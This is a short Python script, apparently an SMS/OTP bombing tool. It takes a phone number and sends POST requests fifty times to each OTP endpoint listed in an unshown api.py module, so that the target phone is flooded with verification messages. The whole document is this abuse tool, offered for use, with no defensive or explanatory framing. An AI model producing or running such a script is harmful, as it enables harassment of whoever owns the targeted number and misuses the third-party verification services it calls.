from api import send_otp_requests
import requests

# Receive phone number input from the user
number = input("Enter your phone number for OTP requests (ex: 9110000000): ")

# Get APIs from api.py
apis = send_otp_requests(number)

# Loop to send OTPs 50 times
for _ in range(50):
    for url, payload in apis:
        try:
            response = requests.post(url, data=payload, timeout=5)
            
            if response.status_code == 200:
                print(f"OTP sent successfully via {url}.")
                # Process the response here if needed
            else:
                print(f"Failed to send OTP via {url}. Status code: {response.status_code}")
                # Handle any other logic for failure
                
        except requests.exceptions.RequestException as e:
            print(f"Error with {url}: {e}")
            # Handle request exceptions
